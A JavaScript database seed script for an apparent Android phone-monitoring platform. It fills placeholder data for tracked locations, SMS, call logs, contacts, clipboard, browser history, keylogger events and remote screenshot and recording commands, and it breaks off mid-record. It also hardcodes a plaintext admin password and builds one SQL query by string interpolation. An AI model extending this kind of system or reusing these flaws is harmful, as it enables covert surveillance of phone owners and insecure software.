'use strict';

require('dotenv').config();
const { 
  sequelize, 
  Device, 
  Location, 
  MediaFile, 
  Contact, 
  SMS, 
  CallLog, 
  User, 
  AppUpdate, 
  Command, 
  DeviceInfo,
  AppInstallation,
  DynamicConfig
} = require('../config/database');
const { Op, QueryTypes } = require('sequelize');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');

// Configure logging
const logger = console;

// Utility functions
const randBetween = (min, max) => Math.random() * (max - min) + min;
const randInt = (min, max) => Math.floor(randBetween(min, max + 1));
const randomBool = () => Math.random() > 0.5;
const randomDate = (start, end) => new Date(start.getTime() + Math.random() * (end.getTime() - start.getTime()));
const nowMinus = (minutes) => new Date(Date.now() - minutes * 60000);
const randomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];

// Helper function to safely handle model operations
async function safeModelOperation(operation, modelName, errorMessage) {
  try {
    const result = await operation();
    return { success: true, result };
  } catch (error) {
    logger.error(`[seed] Error in ${modelName}: ${errorMessage}`, error.message);
    if (process.env.NODE_ENV === 'development') {
      logger.error(error.stack);
    }
    return { success: false, error };
  }
}

// Helper function to check if a table exists
async function tableExists(tableName) {
  const query = `
    SELECT COUNT(*) as count 
    FROM information_schema.tables 
    WHERE table_schema = DATABASE() 
    AND table_name = '${tableName}'
  `;
  const [results] = await sequelize.query(query, { type: QueryTypes.SELECT });
  return results && results.count > 0;
}

async function seedDeviceInfo(devices) {
  if (!DeviceInfo) {
    console.warn('[seed] DeviceInfo model is not available. Skipping device info seeding.');
    return;
  }
  
  const qi = sequelize.getQueryInterface();
  let successCount = 0;
  
  // Check if table exists first - handle case sensitivity
  const tables = await qi.showAllTables();
  const tableName = 'device_info';
  const tableExists = tables.some(t => {
    const table = typeof t === 'string' ? t : (t.tableName || '');
    return table.toLowerCase() === tableName.toLowerCase();
  });

  if (!tableExists) {
    console.warn(`[seed] Table ${tableName} does not exist. Skipping device info seeding.`);
    return;
  }

  for (const d of devices) {
    try {
      // Check if device info already exists
      const [results] = await sequelize.query(
        'SELECT id FROM device_info WHERE device_id = ?',
        { replacements: [d.device_id] }
      );
      
      if (results.length > 0) {
        console.log(`[seed] Device info already exists for device ${d.device_id}`);
        continue; // Skip if already exists
      }
      
      const deviceInfo = {
        device_id: parseInt(d.device_id), // Ensure device_id is an integer
        hardware_info: {
          model: d.model || 'Pixel 6',
          manufacturer: d.manufacturer || 'Google',
          brand: 'Google',
          board: 'raven',
          bootloader: 'raven-1.1-8828342',
          device: 'raven',
          display: 'SD1A.210817.036',
          fingerprint: 'google/raven/raven:12/SD1A.210817.036/7805805:user/release-keys',
          hardware: 'raven',
          host: 'abhost',
          product: 'raven',
          serial: '8A2X11K1K',
          tags: 'release-keys',
          type: 'user',
          user: 'android-build',
          baseband: 'g5123b-97927-220505-B-8400691',
          boottime: '1234567890',
          cpu_abi: 'arm64-v8a',
          device_codename: 'raven',
          device_type: 'handset',
          hardware_serial: 'ABC123456789',
          has_notch: true,
          is_emulator: false,
          is_phone: true,
          is_tablet: false,
          is_tv: false,
          is_wear: false,
          kernel_version: '5.10.43-android12-9-00001-gf4b9b1a9a6d6'
        },
        software_info: {
          android_version: '12',
          api_level: 31,
          base_os: 'Android 12',
          build_id: 'SD1A.210817.036',
          codename: 'S',
          incremental: '7805805',
          preview_sdk_int: 0,
          release: '12',
          sdk_int: 31,
          security_patch: '2022-05-05',
          build_number: 'SQ1D.220205.004',
          build_tags: 'release-keys',
          build_type: 'user'
        },
        network_info: {
          ipv4: '192.168.1.100',
          ipv6: '2607:f8b0:4009:80b::200e',
          mac_address: '02:00:00:00:00:00',
          ssid: 'AndroidWifi',
          bssid: '02:00:00:00:00:00',
          link_speed: 65,
          network_id: 1,
          rssi: -50,
          is_connected: true,
          is_failover: false,
          is_roaming: false,
          network_type: 'WIFI',
          ssid_hidden: false,
          frequency: 2412
        },
        security_info: {
          is_encrypted: true,
          is_device_secure: true,
          is_screen_lock_enabled: true,
          is_trust_agents_enabled: false,
          is_keyguard_secure: true,
          is_keyguard_disabled: false,
          is_keyguard_requires_password: true
        },
        system_settings: {
          screen_timeout: 30000,
          screen_brightness: 128,
          screen_auto_rotate: true,
          screen_sleep_timeout: 30000,
          screen_off_timeout: 60000,
          font_scale: 1.0,
          transition_animation_scale: 1.0,
          window_animation_scale: 1.0
        },
        sensors: [
          {
            name: 'Accelerometer',
            vendor: 'Google Inc.',
            version: 1,
            type: 1,
            max_range: 39.2266,
            resolution: 0.0023956299,
            power: 0.13,
            min_delay: 5000
          },
          {
            name: 'Magnetometer',
            vendor: 'Google Inc.',
            version: 1,
            type: 2,
            max_range: 4912.0,
            resolution: 0.15,
            power: 0.5,
            min_delay: 10000
          },
          {
            name: 'Gyroscope',
            vendor: 'Google Inc.',
            version: 1,
            type: 4,
            max_range: 34.906586,
            resolution: 0.0010652645,
            power: 0.5,
            min_delay: 5000
          }
        ],
        permissions: [
          'android.permission.INTERNET',
          'android.permission.ACCESS_NETWORK_STATE',
          'android.permission.ACCESS_WIFI_STATE',
          'android.permission.READ_PHONE_STATE',
          'android.permission.READ_CONTACTS',
          'android.permission.READ_CALL_LOG',
          'android.permission.READ_SMS',
          'android.permission.ACCESS_FINE_LOCATION',
          'android.permission.CAMERA',
          'android.permission.RECORD_AUDIO',
          'android.permission.READ_EXTERNAL_STORAGE',
          'android.permission.WRITE_EXTERNAL_STORAGE'
        ],
        last_updated: new Date()
      };

      await DeviceInfo.create(deviceInfo);
      successCount++;
      console.log(`[seed] Device info created for device ${d.device_id}`);
    } catch (error) {
      console.warn(`[seed] Error inserting device info for ${d.device_id}:`, error.message);
      console.error(error);
    }
  }

  if (successCount > 0) {
    console.log(`[seed] Device info created for ${successCount} devices`);
  } else {
    console.warn('[seed] No device info was created. Check the device_info table schema and data.');
  }
}

async function seedCommands(devices) {
  if (!Command) return;
  const qi = sequelize.getQueryInterface();
  let successCount = 0;
  
  // Check if table exists first
  const tables = await qi.showAllTables();
  const tableName = 'commands';
  const tableExists = tables.some(t => 
    (typeof t === 'string' && t === tableName) ||
    (typeof t === 'object' && t.tableName === tableName)
  );

  if (!tableExists) {
    console.warn(`[seed] Table ${tableName} does not exist. Skipping commands seeding.`);
    return;
  }

  for (const d of devices) {
    const commands = [
      { 
        device_id: d.device_id,
        command_type: 'PING', 
        status: 'pending', 
        parameters: { interval: 60 },
        expires_at: new Date(Date.now() + 3600000) // 1 hour from now
      },
      { 
        device_id: d.device_id,
        command_type: 'SYNC_CONTACTS', 
        status: 'sent', 
        parameters: { full_sync: true },
        expires_at: new Date(Date.now() + 86400000) // 24 hours from now
      },
      { 
        device_id: d.device_id,
        command_type: 'CAPTURE_SCREENSHOT', 
        status: 'completed', 
        parameters: { quality: 'high' },
        result: 'Screenshot captured successfully',
        expires_at: new Date(Date.now() + 3600000) // 1 hour from now
      },
      { 
        device_id: d.device_id,
        command_type: 'START_RECORDING', 
        status: 'failed', 
        parameters: { duration: 300, quality: 'high' },
        result: 'Failed to start recording: Microphone permission denied',
        expires_at: new Date(Date.now() - 3600000) // Expired 1 hour ago
      }
    ];

    for (const cmd of commands) {
      try {
        // Check if command already exists
        const [results] = await sequelize.query(
          'SELECT id FROM commands WHERE device_id = ? AND command_type = ?',
          { replacements: [cmd.device_id, cmd.command_type] }
        );
        
        if (results.length > 0) continue; // Skip if already exists
        
        // Insert new command
        await qi.bulkInsert('commands', [{
          ...cmd,
          parameters: JSON.stringify(cmd.parameters),
          created_at: new Date(),
          updated_at: new Date()
        }]);
        
        successCount++;
      } catch (error) {
        console.warn(`[seed] Error inserting command ${cmd.command_type} for device ${cmd.device_id}:`, error.message);
      }
    }
  }

  if (successCount > 0) {
    console.log(`[seed] Commands inserted: ${successCount}`);
  } else {
    console.warn('[seed] No commands were inserted. Check the commands table schema.');
  }
}

// Helper function to upsert records
async function upsert(Model, where, values) {
  try {
    const [instance, created] = await Model.findOrCreate({
      where,
      defaults: { ...where, ...values }
    });
    
    if (!created) {
      await instance.update(values);
    }
    
    return instance;
  } catch (error) {
    console.error(`[seed] Error in upsert for ${Model.name}:`, error.message);
    throw error;
  }
}

// Helper function to create a test admin user if it doesn't exist
async function createTestAdmin() {
  try {
    const [admin] = await User.findOrCreate({
      where: { email: 'admin@hawkshaw.com' },
      defaults: {
        username: 'admin',
        email: 'admin@hawkshaw.com',
        password: 'Admin@1234', // In production, this should be hashed
        role: 'admin',
        is_active: true,
        last_login: new Date()
      }
    });
    
    return admin;
  } catch (error) {
    console.error('[seed] Error creating test admin:', error.message);
    return null;
  }
}

async function seedDevices() {
  const devices = [
    { 
      device_id: 'DEVICE-ALPHA', 
      device_name: 'Pixel 7', 
      model: 'Pixel 7', 
      manufacturer: 'Google',
      android_version: '13',
      api_level: 33,
      ip_address: '127.0.0.1',
      status: 'online',
      is_active: true,
      registration_date: new Date(),
      last_seen: new Date()
    },
    { 
      device_id: 'DEVICE-BRAVO', 
      device_name: 'Galaxy S22', 
      model: 'SM-S901B', 
      manufacturer: 'Samsung',
      android_version: '13',
      api_level: 33,
      ip_address: '127.0.0.2',
      status: 'online',
      is_active: true,
      registration_date: new Date(),
      last_seen: new Date(Date.now() - 3600000) // 1 hour ago
    },
    { 
      device_id: 'DEVICE-CHARLIE', 
      device_name: 'OnePlus 11', 
      model: 'CPH2447', 
      manufacturer: 'OnePlus',
      android_version: '13',
      api_level: 33,
      ip_address: '127.0.0.3',
      status: 'online',
      is_active: true,
      registration_date: new Date(),
      last_seen: new Date(Date.now() - 86400000) // 1 day ago
    },
  ];

  const out = [];
  for (const d of devices) {
    try {
      const row = await Device.findOrCreate({
        where: { device_id: d.device_id },
        defaults: d
      });
      out.push(row[0]);
    } catch (error) {
      console.error(`[seed] Error creating device ${d.device_id}:`, error.message);
    }
  }
  
  console.log(`[seed] Devices processed: ${out.length} total`);
  return out;
}

async function seedLocations(devices) {
  if (!Location) return;
  let count = 0;
  const qi = sequelize.getQueryInterface();
  
  // Check if table exists
  const tables = await qi.showAllTables();
  const tableName = 'device_locations';
  const tableExists = tables.some(t => 
    (typeof t === 'string' && t === tableName) || 
    (typeof t === 'object' && t.tableName === tableName)
  );
  
  if (!tableExists) {
    console.warn(`[seed] Table ${tableName} does not exist. Skipping location seeding.`);
    return;
  }

  for (const d of devices) {
    const baseLat = 12.9716 + randBetween(-0.02, 0.02);
    const baseLng = 77.5946 + randBetween(-0.02, 0.02);
    
    for (let i = 0; i < 5; i++) {
      try {
        const timestamp = nowMinus(30 - i * 5);
        
        // Use raw query to ensure proper ID handling
        await sequelize.query(
          `INSERT INTO device_locations 
           (device_id, latitude, longitude, altitude, accuracy, speed, bearing, 
            provider, is_mocked, battery_level, timestamp, created_at) 
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
          {
            replacements: [
              d.device_id,
              baseLat + randBetween(-0.005, 0.005),
              baseLng + randBetween(-0.005, 0.005),
              randInt(800, 900) / 10, // altitude
              randInt(5, 20),        // accuracy
              randInt(0, 12),        // speed
              randInt(0, 359),       // bearing
              'gps',                 // provider
              Math.random() > 0.8 ? 1 : 0,  // is_mocked (as 0 or 1 for MySQL boolean)
              randInt(10, 100),      // battery_level
              timestamp,             // timestamp
              timestamp              // created_at
            ]
          }
        );
        
        count++;
      } catch (error) {
// Error handling code
        console.warn(`[seed] Error inserting location for device ${d.device_id}:`, error.message);
        // Continue with next location if one fails
      }
    }
  }
  
  if (count > 0) {
    console.log(`[seed] Locations inserted: ${count}`);
  } else {
    console.warn('[seed] No locations were inserted. Check if the device_locations table exists and has the correct schema.');
  }
}

async function seedMedia(devices) {
  if (!MediaFile) return;
  let count = 0;
  for (const d of devices) {
    const files = [
      { name: 'IMG_0001.jpg', type: 'image/jpeg', media_type: 'image', size: 245678 },
      { name: 'VID_0002.mp4', type: 'video/mp4', media_type: 'video', size: 20456789 },
      { name: 'AUD_0003.m4a', type: 'audio/mp4', media_type: 'audio', size: 3456789 },
    ];
    for (const f of files) {
      try {
        await MediaFile.create({
          device_id: d.device_id,
          file_path: `/storage/emulated/0/DCIM/Camera/${f.name}`,
          filename: f.name,
          original_name: f.name,
          file_size: f.size,
          mime_type: f.type,
          media_type: f.media_type,
          width: f.media_type === 'image' ? 1920 : null,
          height: f.media_type === 'image' ? 1080 : null,
          duration: f.media_type === 'video' ? 12 : null,
          date_taken: nowMinus(randInt(10, 120)),
          created_at: new Date()
        });
        count++;
      } catch (error) {
        console.warn(`[seed] Error inserting media file ${f.name} for device ${d.device_id}:`, error.message);
      }
    }
  }
  console.log(`[seed] Media files inserted: ${count}`);
}

async function seedContacts(devices) {
  const qi = sequelize.getQueryInterface();
  let successCount = 0;
  
  // Check if table exists first
  const tables = await qi.showAllTables();
  const tableName = 'device_contacts';
  const tableExists = tables.some(t => 
    (typeof t === 'string' && t === tableName) ||
    (typeof t === 'object' && t.tableName === tableName)
  );

  if (!tableExists) {
    console.warn(`[seed] Table ${tableName} does not exist. Skipping contacts seeding.`);
    return;
  }

  for (const d of devices) {
    const contacts = [
      {
        device_id: d.device_id, // Use the string device_id
        contact_id: `C-${d.device_id}-1001`,
        display_name: 'John Doe',
        first_name: 'John',
        middle_name: '',
        last_name: 'Doe',
        name_prefix: 'Mr.',
        name_suffix: '',
        phonetic_name: 'JOHN DOE',
        nickname: 'Johnny',
        organization: 'Acme Inc',
        job_title: 'Software Engineer',
        department: 'Engineering',
        note: 'Met at conference',
        photo_uri: 'content://com.android.contacts/contacts/1/photo',
        photo_thumb_uri: 'content://com.android.contacts/contacts/1/photo/thumb',
        starred: 1,
        times_contacted: 5,
        last_time_contacted: nowMinus(10),
        in_visible_group: 1,
        has_phone_number: 1,
        has_email: 1,
        has_postal_address: 0,
        custom_ringtone: 'content://media/internal/audio/media/123',
        send_to_voicemail: 0,
        is_user_profile: 0,
        contact_last_updated_timestamp: nowMinus(10),
        created_at: new Date(),
        updated_at: new Date()
      },
      {
        device_id: d.device_id, // Use the string device_id
        contact_id: `C-${d.device_id}-1002`,
        display_name: 'Jane Smith',
        first_name: 'Jane',
        middle_name: 'A.',
        last_name: 'Smith',
        name_prefix: 'Ms.',
        name_suffix: '',
        phonetic_name: 'JANE SMITH',
        nickname: 'Janey',
        organization: 'Globex Corp',
        job_title: 'Product Manager',
        department: 'Product',
        note: 'Team lead',
        photo_uri: 'content://com.android.contacts/contacts/2/photo',
        photo_thumb_uri: 'content://com.android.contacts/contacts/2/photo/thumb',
        starred: 0,
        times_contacted: 2,
        last_time_contacted: nowMinus(5),
        in_visible_group: 1,
        has_phone_number: 1,
        has_email: 1,
        has_postal_address: 1,
        custom_ringtone: null,
        send_to_voicemail: 0,
        is_user_profile: 0,
        contact_last_updated_timestamp: nowMinus(5),
        created_at: new Date(),
        updated_at: new Date()
      },
      {
        device_id: d.device_id, // Use the string device_id
        contact_id: `C-${d.device_id}-1003`,
        display_name: 'Support Hotline',
        first_name: 'Support',
        last_name: 'Hotline',
        organization: 'Customer Support',
        job_title: 'Support Representative',
        starred: 0,
        times_contacted: 1,
        last_time_contacted: nowMinus(2),
        in_visible_group: 1,
        has_phone_number: 1,
        has_email: 1,
        has_postal_address: 0,
        send_to_voicemail: 1,
        is_user_profile: 0,
        contact_last_updated_timestamp: nowMinus(1),
        created_at: new Date(),
        updated_at: new Date()
      }
    ];

    for (const contact of contacts) {
      try {
        await qi.bulkInsert('device_contacts', [contact], { ignoreDuplicates: true });
        successCount++;
      } catch (error) {
        console.warn(`[seed] Error inserting contact ${contact.contact_id} for device ${d.device_id}:`, error.message);
      }
    }
  }

  if (successCount > 0) {
    console.log(`[seed] Contacts inserted: ${successCount}`);
  } else {
    console.warn('[seed] No contacts were inserted. Check the device_contacts table schema.');
  }
}

async function seedSMS(devices) {
  const qi = sequelize.getQueryInterface();
  let successCount = 0;
  
  // Check if table exists first
  const tables = await qi.showAllTables();
  const tableName = 'sms';
  const tableExists = tables.some(t => 
    (typeof t === 'string' && t === tableName) ||
    (typeof t === 'object' && t.tableName === tableName)
  );

  if (!tableExists) {
    console.warn(`[seed] Table ${tableName} does not exist. Skipping SMS seeding.`);
    return;
  }

  for (const d of devices) {
    const thread1 = Math.floor(Math.random() * 1000000);
    const thread2 = Math.floor(Math.random() * 1000000);
    
    const messages = [
      {
        device_id: d.device_id, // Use the string device_id
        thread_id: thread1,
        address: '+12025550123',
        contact_name: 'John Doe',
        body: 'Hello from DK Hawkshaw',
        type: 'inbox',
        read: 1, // Use 1 for true in MySQL
        date: nowMinus(30),
        created_at: new Date(),
        updated_at: new Date()
      },
      {
        device_id: d.device_id, // Use the string device_id
        thread_id: thread1,
        address: '+12025550123',
        contact_name: 'John Doe',
        body: 'Meeting at 6PM',
        type: 'sent',
        read: 1, // Use 1 for true in MySQL
        date: nowMinus(25),
        created_at: new Date(),
        updated_at: new Date()
      },
      {
        device_id: d.device_id, // Use the string device_id
        thread_id: thread2,
        address: '+18005551234',
        contact_name: 'Support',
        body: 'Your support ticket has been resolved',
        type: 'inbox',
        read: 0, // Use 0 for false in MySQL
        date: nowMinus(10),
        created_at: new Date(),
        updated_at: new Date()
      }
    ];

    for (const msg of messages) {
      try {
        await qi.bulkInsert('sms', [msg], { ignoreDuplicates: true });
        successCount++;
      } catch (error) {
        console.warn(`[seed] Error inserting SMS for device ${d.device_id}:`, error.message);
      }
    }
  }

  if (successCount > 0) {
    console.log(`[seed] SMS messages inserted: ${successCount}`);
  } else {
    console.warn('[seed] No SMS messages were inserted. Check the SMS table schema.');
  }
}

async function seedCallLogs(devices) {
  const qi = sequelize.getQueryInterface();
  let successCount = 0;
  
  // Check if table exists first
  const tables = await qi.showAllTables();
  const tableName = 'call_logs';
  const tableExists = tables.some(t => 
    (typeof t === 'string' && t === tableName) ||
    (typeof t === 'object' && t.tableName === tableName)
  );

  if (!tableExists) {
    console.warn(`[seed] Table ${tableName} does not exist. Skipping call logs seeding.`);
    return;
  }

  for (const d of devices) {
    const calls = [
      {
        device_id: d.device_id, // Use the string device_id
        number: '+12025550123',
        contact_name: 'John Doe',
        type: 'incoming',
        duration: 45,
        date: nowMinus(30),
        is_read: 1, // Use 1 for true in MySQL
        created_at: new Date(),
        updated_at: new Date()
      },
      {
        device_id: d.device_id, // Use the string device_id
        number: '+12025550456',
        contact_name: 'Jane Smith',
        type: 'outgoing',
        duration: 120,
        date: nowMinus(20),
        is_read: 1, // Use 1 for true in MySQL
        created_at: new Date(),
        updated_at: new Date()
      },
      {
        device_id: d.device_id, // Use the string device_id
        number: '+18005551234',
        contact_name: 'Support',
        type: 'missed',
        duration: 0,
        date: nowMinus(10),
        is_read: 0, // Use 0 for false in MySQL
        created_at: new Date(),
        updated_at: new Date()
      }
    ];

    for (const call of calls) {
      try {
        await qi.bulkInsert('call_logs', [call], { ignoreDuplicates: true });
        successCount++;
      } catch (error) {
        console.warn(`[seed] Error inserting call log for device ${d.device_id}:`, error.message);
      }
    }
  }

  if (successCount > 0) {
    console.log(`[seed] Call logs inserted: ${successCount}`);
    console.warn('[seed] No call logs were inserted. Check the call_logs table schema.');
  }
}

async function seedAppUpdates(devices) {
  const qi = sequelize.getQueryInterface();
  let successCount = 0;
  
  // Check if table exists first - handle case sensitivity
  const tables = await qi.showAllTables();
  const tableName = 'app_updates';
  const tableExists = tables.some(t => {
    const table = typeof t === 'string' ? t : (t.tableName || '');
    return table.toLowerCase() === tableName.toLowerCase();
  });

  if (!tableExists) {
    console.warn(`[seed] Table ${tableName} does not exist. Skipping app updates seeding.`);
    return [];
  }

  // Get the table structure to see what columns exist
  let tableColumns = [];
  try {
    const [results] = await sequelize.query(`DESCRIBE ${tableName}`);
    tableColumns = results.map(col => col.Field);
    console.log(`[seed] Found columns in ${tableName}:`, tableColumns);
  } catch (error) {
    console.error(`[seed] Error getting table structure for ${tableName}:`, error.message);
    return [];
  }

  // Function to filter out non-existent columns and prepare values
  const filterColumns = (obj) => {
    const filtered = {};
    for (const [key, value] of Object.entries(obj)) {
      if (tableColumns.includes(key)) {
        // Handle JSON fields
        if ((key === 'whats_new' || key === 'device_models' || key === 'exclude_device_models' || key === 'android_versions' || key === 'regions') && 
            value !== null && value !== undefined) {
          // If it's already a string, try to parse it as JSON
          if (typeof value === 'string') {
            try {
              // If it's already a JSON string, parse and re-stringify to ensure it's valid
              const parsed = JSON.parse(value);
              filtered[key] = JSON.stringify(parsed);
            } catch (e) {
              // If it's a plain string, convert it to a JSON array
              filtered[key] = JSON.stringify([value]);
            }
          } else if (Array.isArray(value)) {
            // If it's an array, stringify it
            filtered[key] = JSON.stringify(value);
          } else if (typeof value === 'object') {
            // If it's an object, stringify it
            filtered[key] = JSON.stringify(value);
          } else {
            // For other cases, just use the value as is
            filtered[key] = value;
          }
        } else {
          // For non-JSON fields, use the value as is
          filtered[key] = value;
        }
      }
    }
    return filtered;
  };

  const updates = [
    {
      id: require('uuid').v4(),
      version: '1.0.0',
      version_code: 100,
      channel: 'stable',
      file_path: '/downloads/app-updates/dkhawkshaw-1.0.0.apk',
      file_name: 'dkhawkshaw-1.0.0.apk',
      file_size: 25 * 1024 * 1024, // 25MB
      checksum: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', // SHA-256 of empty string
      is_required: true,
      min_sdk_version: 24,
      is_active: true,
      release_notes: 'Initial release of DK Hawkshaw',
      whats_new: ['Added core tracking features'],
      rollout_percentage: 100,
      is_rollout_paused: false,
      created_at: new Date(),
      updated_at: new Date()
    },
    {
      id: require('uuid').v4(),
      version: '1.1.0',
      version_code: 110,
      channel: 'beta',
      file_path: '/downloads/app-updates/dkhawkshaw-1.1.0-beta.apk',
      file_name: 'dkhawkshaw-1.1.0-beta.apk',
      file_size: 28 * 1024 * 1024, // 28MB
      checksum: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b856', // Different checksum
      is_required: false,
      min_sdk_version: 24,
      is_active: true,
      release_notes: 'Beta release with new features',
      whats_new: ['Added new tracking features', 'Improved performance'],
      rollout_percentage: 50, // Only 50% rollout for beta
      is_rollout_paused: false,
      created_at: new Date(),
      updated_at: new Date()
    }
  ].map(update => filterColumns(update));

  for (const update of updates) {
    try {
      // Build the SET part of the query dynamically based on available columns
      const setClause = Object.keys(update)
        .filter(key => key !== 'id' && key !== 'version_code')
        .map(key => `${key} = :${key}`)
        .join(', ');
      
      // Build the ON DUPLICATE KEY UPDATE part
      const onDuplicateClause = Object.keys(update)
        .filter(key => key !== 'id' && key !== 'version_code')
        .map(key => `${key} = VALUES(${key})`)
        .join(', ');
      
      // Build the column names and values for the INSERT
      const columns = Object.keys(update).join(', ');
      const values = Object.keys(update).map(key => `:${key}`).join(', ');
      
      // Execute the query with ON DUPLICATE KEY UPDATE
      const query = `
        INSERT INTO app_updates (${columns}) 
        VALUES (${values})
        ON DUPLICATE KEY UPDATE ${onDuplicateClause}
      `;
      
      await sequelize.query(query, {
        replacements: update,
        type: sequelize.QueryTypes.INSERT
      });
      
      successCount++;
      console.log(`[seed] App update ${update.version} (${update.version_code}) processed`);
    } catch (error) {
      console.error(`[seed] Error processing app update ${update.version_code}:`, error.message);
      console.error(error);
    }
  }
  
  if (successCount > 0) {
    console.log(`[seed] Inserted/updated ${successCount} app updates`);
  } else {
    console.warn('[seed] No app updates were processed.');
  }
  
  return [];
}

async function seedBrowserHistory(devices) {
  const qi = sequelize.getQueryInterface();
  let successCount = 0;
  
  // Check if table exists first
  const tables = await qi.showAllTables();
  const tableName = 'device_browser_history';
  const tableExists = tables.some(t => 
    (typeof t === 'string' && t === tableName) ||
    (typeof t === 'object' && t.tableName === tableName)
  );

  if (!tableExists) {
    console.warn(`[seed] Table ${tableName} does not exist. Skipping browser history seeding.`);
    return;
  }

  for (const d of devices) {
    const historyEntries = [
      {
        device_id: d.id, // Use the UUID from the device
        url: 'https://news.ycombinator.com/',
        title: 'Hacker News',
        original_url: null,
        favicon: 'https://news.ycombinator.com/favicon.ico',
        visit_count: 3,
        typed_count: 1,
        last_visit_time: new Date(),
        created_at: new Date()
      },
      {
        device_id: d.id, // Use the UUID from the device
        url: 'https://www.google.com/search?q=dk+hawkshaw',
        title: 'dk hawkshaw - Google Search',
        original_url: 'https://www.google.com/',
        favicon: 'https://www.google.com/favicon.ico',
        visit_count: 2,
        typed_count: 0,
        last_visit_time: nowMinus(10),
        created_at: nowMinus(10)
      },
      {
        device_id: d.id, // Use the UUID from the device
        url: 'https://github.com/dkhawkshaw',
        title: 'DK Hawkshaw - GitHub',
        original_url: null,
        favicon: 'https://github.com/favicon.ico',
        visit_count: 5,
        typed_count: 2,
        last_visit_time: nowMinus(5),
        created_at: nowMinus(20)
      }
    ];

    for (const entry of historyEntries) {
      try {
        await qi.bulkInsert('device_browser_history', [entry], { ignoreDuplicates: true });
        successCount++;
      } catch (error) {
        console.warn(`[seed] Error inserting browser history for device ${d.device_id}:`, error.message);
      }
    }
  }

  if (successCount > 0) {
    console.log(`[seed] Browser history entries inserted: ${successCount}`);
  } else {
    console.warn('[seed] No browser history entries were inserted. Check the device_browser_history table schema.');
  }
}

async function seedBookmarks(devices) {
  const qi = sequelize.getQueryInterface();
  let successCount = 0;
  
  // Check if table exists first
  const tables = await qi.showAllTables();
  const tableName = 'device_browser_bookmarks';
  const tableExists = tables.some(t => 
    (typeof t === 'string' && t === tableName) ||
    (typeof t === 'object' && t.tableName === tableName)
  );

  if (!tableExists) {
    console.warn(`[seed] Table ${tableName} does not exist. Skipping bookmarks seeding.`);
    return;
  }

  for (const d of devices) {
    const bookmarks = [
      {
        device_id: d.id, // Use the UUID from the device
        url: 'https://developer.android.com',
        title: 'Android Developers',
        parent_id: null,
        type: 'url',
        position: 0,
        date_added: nowMinus(60),
        date_modified: nowMinus(60),
        favicon: 'https://developer.android.com/favicon.ico',
        thumbnail: null,
        tags: 'android,docs',
        description: 'Official Android documentation',
        visit_count: 1,
        last_visit_time: nowMinus(50),
        created_at: nowMinus(60)
      },
      {
        device_id: d.id, // Use the UUID from the device
        url: 'https://sequelize.org/',
        title: 'Sequelize ORM',
        parent_id: null,
        type: 'url',
        position: 1,
        date_added: nowMinus(120),
        date_modified: nowMinus(120),
        favicon: 'https://sequelize.org/favicon.ico',
        thumbnail: null,
        tags: 'orm,nodejs',
        description: 'Sequelize official site',
        visit_count: 2,
        last_visit_time: nowMinus(30),
        created_at: nowMinus(120)
      },
      {
        device_id: d.id, // Use the UUID from the device
        url: 'https://nodejs.org/',
        title: 'Node.js',
        parent_id: null,
        type: 'url',
        position: 2,
        date_added: nowMinus(30),
        date_modified: nowMinus(30),
        favicon: 'https://nodejs.org/static/images/favicons/favicon.ico',
        thumbnail: null,
        tags: 'nodejs,runtime',
        description: 'Node.js JavaScript runtime',
        visit_count: 3,
        last_visit_time: nowMinus(10),
        created_at: nowMinus(30)
      }
    ];

    for (const bookmark of bookmarks) {
      try {
        await qi.bulkInsert('device_browser_bookmarks', [bookmark], { ignoreDuplicates: true });
        successCount++;
      } catch (error) {
        console.warn(`[seed] Error inserting bookmark for device ${d.device_id}:`, error.message);
      }
    }
  }

  if (successCount > 0) {
    console.log(`[seed] Browser bookmarks inserted: ${successCount}`);
  } else {
    console.warn('[seed] No bookmarks were inserted. Check the device_browser_bookmarks table schema.');
  }
}

async function seedClipboard(devices) {
  const qi = sequelize.getQueryInterface();
  let successCount = 0;
  
  // Check if table exists first
  const tables = await qi.showAllTables();
  const tableName = 'clipboard_data';
  const tableExists = tables.some(t => 
    (typeof t === 'string' && t === tableName) ||
    (typeof t === 'object' && t.tableName === tableName)
  );

  if (!tableExists) {
    console.warn(`[seed] Table ${tableName} does not exist. Skipping clipboard data seeding.`);
    return;
  }

  for (const d of devices) {
    const clips = [
      {
        device_id: d.device_id, // Use the string device_id
        content: 'Sample clipboard text 1',
        timestamp: nowMinus(60),
        created_at: new Date(),
        updated_at: new Date()
      },
      {
        device_id: d.device_id, // Use the string device_id
        content: 'https://example.com',
        timestamp: nowMinus(30),
        created_at: new Date(),
        updated_at: new Date()
      },
      {
        device_id: d.device_id, // Use the string device_id
        content: 'Email: user@example.com',
        timestamp: nowMinus(15),
        created_at: new Date(),
        updated_at: new Date()
      }
    ];

    for (const clip of clips) {
      try {
        await qi.bulkInsert('clipboard_data', [clip], { ignoreDuplicates: true });
        successCount++;
      } catch (error) {
        console.warn(`[seed] Error inserting clipboard data for device ${d.device_id}:`, error.message);
      }
    }
  }

  if (successCount > 0) {
    console.log(`[seed] Clipboard data inserted: ${successCount}`);
  } else {
    console.warn('[seed] No clipboard data was inserted. Check the clipboard_data table schema.');
  }
}

async function seedKeylogger(devices) {
  const qi = sequelize.getQueryInterface();
  let successCount = 0;
  
  // Check if table exists first
  const tables = await qi.showAllTables();
  const tableName = 'device_keylogger';
  const tableExists = tables.some(t => 
    (typeof t === 'string' && t === tableName) ||
    (typeof t === 'object' && t.tableName === tableName)
  );

  if (!tableExists) {
    console.warn(`[seed] Table ${tableName} does not exist. Skipping keylogger seeding.`);
    return;
  }

  const keylogs = [
    {
      package_name: 'com.whatsapp',
      activity_name: 'com.whatsapp.HomeActivity',
      key_event: 'key_down',
      key_code: 29, // A key
      key_character: 'a',
      meta_state: 0,
      is_shift_pressed: 0,
      is_alt_pressed: 0,
      is_ctrl_pressed: 0,
      is_function_pressed: 0,
      is_caps_lock_on: 0,
      is_num_lock_on: 0,
      is_scroll_lock_on: 0,
      device_id: null, // This will be set for each device
      event_time: nowMinus(10),
      created_at: new Date()
    },
    {
      package_name: 'com.android.messaging',
      activity_name: 'com.android.messaging.ui.conversation.ConversationActivity',
      key_event: 'key_up',
      key_code: 66, // ENTER key
      key_character: '\n',
      meta_state: 0,
      is_shift_pressed: 0,
      is_alt_pressed: 0,
      is_ctrl_pressed: 0,
